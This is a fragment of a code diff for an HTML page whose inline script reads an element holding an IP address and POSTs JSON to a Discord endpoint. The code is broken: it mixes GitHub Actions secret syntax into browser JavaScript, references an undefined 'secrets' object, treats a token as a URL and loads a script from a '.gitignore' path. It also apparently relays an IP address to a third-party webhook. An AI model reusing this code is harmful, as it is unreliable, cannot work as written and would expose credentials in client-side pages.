@@ -8,12 +8,10 @@
     <script src=".gitignore\config.js"></script>
     
     <script>
-        env:
-        URL: ${{ secrets.DISCORD_TOKEN }}
         function sendMessage(json) {
         let ip = document.getElementById("ip").innerHTML;
         const request = new XMLHttpRequest();
-        request.open("POST", $URL);
+        request.open("POST", secrets.DISCORD_TOKEN);
 
         request.setRequestHeader('Content-type', 'application/json');
 
